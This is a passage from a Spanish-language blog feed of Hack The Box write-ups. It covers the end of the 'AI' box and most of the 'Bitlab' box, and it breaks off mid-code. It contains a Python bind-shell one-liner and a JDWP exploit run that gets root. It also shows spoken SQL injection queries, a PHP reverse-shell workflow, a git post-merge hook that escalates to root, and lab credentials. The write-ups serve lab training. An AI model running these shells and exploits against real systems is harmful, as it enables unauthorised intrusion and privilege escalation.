    <img src="/images/htb/ai/1.1-web-php-3.png"  class="center"  style="border-radius: 8px;"  />


<p>Se trata de crear un .wav desde un archivo de texto (.txt -&gt; .mp3 -&gt; .wav), subirlo y ver que pasa, el resultado es una excepción que da un hint: hay un base de datos del otro lado, por lo que puede ser probable (más con la excepción que se pueda hacer una inyección).</p>

    <img src="/images/htb/ai/1.1-web-rce-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-rce-2.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="punto-de-entrada">Punto de entrada</h2>
<p>Los pasos para tratar de armar una inyección sql, fueron los mismos que antes para un RCE, basados en lo que gobuster tiró de resultado contra AI, se puede ver que hay algunos .php, uno de ellos en particular suena interesante; <code>intelligence.php</code>.</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/07 15:23:07 Starting gobuster
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/uploads (Status: 301)
/db.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
===============================================================
2020/02/07 15:48:32 Finished
===============================================================
</code></pre><p>Al mirar el contenido de <code>intelligence.php</code>, es fácil notar que es la API de la AI, y esto es útil, ya que nos da base para saber como deberíamos de interactuar con la AI para armar la inyección que se precisa.</p>

    <img src="/images/htb/ai/2.1-rce-2.png"  class="center"  style="border-radius: 8px;"  />


<p>Después de un montón de prueba-error (que no está de más decir, si no fuese por la ayuda/guía de <a href="https://www.hackthebox.eu/profile/10423">Interep</a> tanto con TTS o la query, no sé si iba a ir mucho más lejos :P), como no soy un habnlante nativo de inglés (ni tampoco tener micrófono), fue por eso la decisión de usar un TTS, con el que me terminé quedando fue con <a href="https://www.text2speech.org/">Text 2 Speech</a>:</p>

    <img src="/images/htb/ai/t2s.png"  class="center"  style="border-radius: 8px;"  />


<p>Las queries conseguidas al final, son así:</p>
<pre><code>User:
Open single quote union select, username from users Comment Database
Password:
Open single quote union select, password from users Comment Database
</code></pre><p>Y una vez que se suben los respectivos.wav generados por el TTS que comenté arriba, se consiguen los siguientes resultados:</p>

    <img src="/images/htb/ai/command-ok-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/command-ok-2.png"  class="center"  style="border-radius: 8px;"  />


<p>Se intenta loguearse a ssh con esas credenciales:</p>
<pre><code>user: alexa
passwd: H,Sq9t6}a&lt;)?q93_
</code></pre><p>Exito!!</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
alexa@10.10.10.163's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb  7 20:27:47 UTC 2020

  System load:  0.14               Processes:           162
  Usage of /:   28.0% of 19.56GB   Users logged in:     1
  Memory usage: 27%                IP address for eth0: 10.10.10.163
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

63 packages can be updated.
15 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
alexa@AI:~$ wc -c user.txt
33 user.txt
</code></pre><h2 id="escalamiento-de-privilegios">Escalamiento de privilegios</h2>
<p>Cuando se revisan que procesos/puertos ahí abiertos, se ve que está el 8080 abierto:</p>
<pre><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
:Port                 
udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
:*                    
udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
:*                    
udp                 UNCONN                   0                     0                                                     [::]:55175                                               [::]
:*                    
tcp                 LISTEN                   0                     1                                                127.0.0.1:8000                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     80                                               127.0.0.1:3306                                             0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                          127.0.0.53%lo:53                                               0.0.0.0:*                    
tcp                 LISTEN                   0                     128                                                0.0.0.0:22                                               0.0.0.0:*                    
tcp                 ESTAB                    0                     0                                             10.10.10.163:22                                           10.10.14.29:58570                
tcp                 ESTAB                    0                     36                                            10.10.10.163:22                                           10.10.14.29:54700                
tcp                 LISTEN                   0                     1                                       [::ffff:127.0.0.1]:8005                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8009                                                   *:*                    
tcp                 LISTEN                   0                     100                                     [::ffff:127.0.0.1]:8080                                                   *:*                    
tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
</code></pre><p>Si se abre un tunnel ssh con <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> para cambiar la configuración del browser y ver que servicio está corriendo ahí, se encuentra que es un tomcat:</p>

    <img src="/images/htb/ai/tomcat-tunnel.png"  class="center"  style="border-radius: 8px;"  />


<p>Y, sorpresa! Está corriendo como root y encima con <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JDWP</a> habilitado..</p>
<pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
</code></pre><p>Con una búsqueda rápida en google, se encuentra este <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
<p>Entonces, para usar ese exploit se crea un <code>bind.sh</code> en <code>/tmp</code> con el siguiente código:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
</code></pre></div><p>Osea, se va a levantar un bind shell escuchando en el puerto 2222, se ejecuta el script:</p>
<pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
[+] Found Runtime class: id=650
[+] Found Runtime.getRuntime(): id=7f9080006b60
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x6ed
[+] Selected payload '/tmp/bind.sh'
[+] Command string object created id:6ee
[+] Runtime.getRuntime() returned context id:0x6ef
[+] found Runtime.exec(): id=7f9080006b98
[+] Runtime.exec() successful, retId=6f0
[!] Command successfully executed
</code></pre><p>Después de eso, si se trata iniciar una conexión contra el servidor con nc a la IP:puerto contra la que se corrió el exploit, se consigue un reverso con root:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
ai.lnx.htb [10.10.10.163] 2222 (?) open
bash: cannot set terminal process group (6086): Inappropriate ioctl for device
bash: no job control in this shell
root@AI:~# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
</code></pre><p>Y, ahí &lsquo;ta, acceso a root y la bandera root.txt :D.</p>
<p>Hasta el momento, esta fue una de las únicas máquinas en HTB que no me ha gustado tanto, gracias más que nada a que el punto de entrada es medio esotérico y realmente no te deja mucha enseñanza al respecto.
Bue, próximamente estoy pensando en empezar a blogear lo que es este viaje de estar preparando el OSCP, para saber, quedar al tanto, &lsquo;ta luego!</p>
]]></content></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-bitlab/</guid><description>Resumen rápido Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para sudo + git, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel. A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.</description><content type="html"><![CDATA[
    <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="resumen-rápido">Resumen rápido</h2>
<p>Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para <code>sudo + git</code>, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel.
A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.</p>
<p>Esta fue una máquina cool, no difícil a nivel técnico, pero una que se necesita enumerar muchísimo, entonces perfecta para mejorar en eso!</p>
<p>Dicho eso, hora de ensuciarse las manos :D</p>
<h2 id="nmap">Nmap</h2>
<p>Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
</code></pre><p>Obtenemos que SSH (22) y HTTP (80) están abiertos más que el servidor web ejecutándose en el puerto 80 es <a href="https://gitlab.com/">Gitlab</a>.</p>
<h2 id="enumeración-web">Enumeración Web</h2>
<p>La página de inicio (<code>http://10.10.10.114/</code>), solamente es la página de login standard de gitlab:</p>

    <img src="/images/htb/bitlab/1.1-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>Probamos a mano los enlaces en la página para ver si funciona, y encontramos con esto que <code>Help</code> funciona, somos redirigidos a un directorio listado que tiene <code>bookmarks.html</code> y lo abrimos:</p>

    <img src="/images/htb/bitlab/1.2-web_enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/bitlab/1.3-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>Vemos que <code>Gitlab Login</code> es código javascript ofuscado, pasamos a hacer desofusación (yo usé <a href="https://lelinhtinh.github.io/de4js/">de4js</a> pero cualquier herramienta de desofuscación o incluso la consola de python sirve):</p>
<p>Del código:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>(<span style="color:#66d9ef">function</span>(){ <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style="color:#e6db74">&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style="color:#e6db74">&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style="color:#e6db74">&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style="color:#e6db74">&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>]; })()
</code></pre></div><p>Obtenemos el siguiente:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> (<span style="color:#66d9ef">function</span> () {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4b18</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">3</span>];
    document[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x4b18</span>[<span style="color:#ae81ff">5</span>];
})()
</code></pre></div><p>Con esas credenciales nos podemos intentamos loguearnos, un usuario llamado <code>clave</code> y con contraseñá <code>11des0081x</code>, nos logueamos exitosamente y tenemos acceso a algunos proyectos:</p>

    <img src="/images/htb/bitlab/1.5-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<p>Si miramos detalladamente en <code>Profile</code> encontramos que este proyecto tiene <a href="https://docs.gitlab.com/ee/topics/autodevops/">Auto DevOps</a> habilitado.
Seguimos enumerando un poco más, y vemos que el proyecto que se llama <code>Deployer</code> está a cargo de manejar eso: deployear las aplicaciones, en la descripción hay un enlace apuntando a a gitlab, nos fijamos que hay en la documentación de <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">webhooks</a>,
después de leer un poco, nos fijamos que hace <code>index.php</code>:</p>

    <img src="/images/htb/bitlab/1.6-web_enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);

$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;

<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</code></pre></div><p>Intentando combinar las piezas que tenemos hasta este momento, podemos darnos cuenta del punto de entrada: tenemos que subir un reverse shell en php, teniéndolo mergeado en master (el código de <code>index.php</code> tiene específicado que un git pull se va a ejecutar si un merge a master sucede), una vez que hacemos eso ejecutamos <code>index.php</code> desde <code>Deployer</code> con esto vamos a tener nuestro reverse shell subido al servidor.</p>
<h2 id="rce---www-data---root">RCE -&gt; www-data -&gt; root</h2>
<p>Subimos el siguiente <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell by pentestmonkey</a> cambiamos <code>$ip = '127.0.0.1'</code> y <code>$port = 1234</code> a nuestra ip y puerto en los que nuestra máquina está escuchando, después lo mergeamos (vamos a ser redirigidos de forma automática a la página para mergearlo).</p>
<p>Ahora que el reverse shell está subido en el servidor, todavía tenemos que ejecutarlo, para eso tenemos que saber cuál es la ruta para hacerlo, si recordamos el proyecto <code>Deployer</code> este tiene un index.php que imprime &ldquo;OK&rdquo; , podemos ver de acceder al path de deployer para ver si se imprime, si lo hace, entonces sabemos que la ruta para nuestro reverse shell será <code>http://10.0.0.14/profile/&lt;name of our reverse shell&gt;</code>:</p>

    <img src="/images/htb/bitlab/1.rce.png"  class="center"  style="border-radius: 8px;"  />


<p>Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar.
Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
</code></pre><p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
</code></pre><p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para <a href="https://git-scm.com/docs/githooks#_post_merge">hooks: post merge</a> y la de <a href="https://git-scm.com/docs/git-pull">git pull</a>.</p>
<p>Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
</code></pre><p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
</code></pre><p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p>
<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -&gt; origin/master
 * [new branch]      patch-2    -&gt; origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
</code></pre><p>Con esto ya podemos irnos a ````/home``` y ver ahí la flag de user y de root.</p>
<h2 id="más-allá-de-root">Más allá de root</h2>
<p>Como dije en el principio del post, hay dos caminos para esta máquina:
Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>
<p>1 - El modo &ldquo;pensado por el creado&rdquo; (user -&gt; root) es haciendo ingenieria inversa.
2 - Aprovecharse de configuraciones mal hechas.</p>
<p>Voy a cubrir el punto uno, pero solamente como hacerse con el usuario, y en el futuro si tengo idea de ingenieria inversa, voy a postear la parte que falta)</p>
<h2 id="usuario">Usuario</h2>
<p>En la página de inicio del proyecto Profile, hay un hint, se menciona una conexión a postgresql y snippets, nos vamos a la página de snippets y encontramos esto:</p>

    <img src="/images/htb/bitlab/1-intended_user.png"  class="center"  style="border-radius: 8px;"  />


<p>Lo abrimos y vemos que es un script para conectarse a la base de datos y hacer un dump de los perfiles:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
</code></pre></div><p>Entonces, desde adentro del proyecto Profile agregamos un archivo con ese código, pero también creamos un array con <code>pg_fetch_all($result)</code> para guardarnos todos los perfiles que se les hace un dump, con eso tenemos este resultado:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
<span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
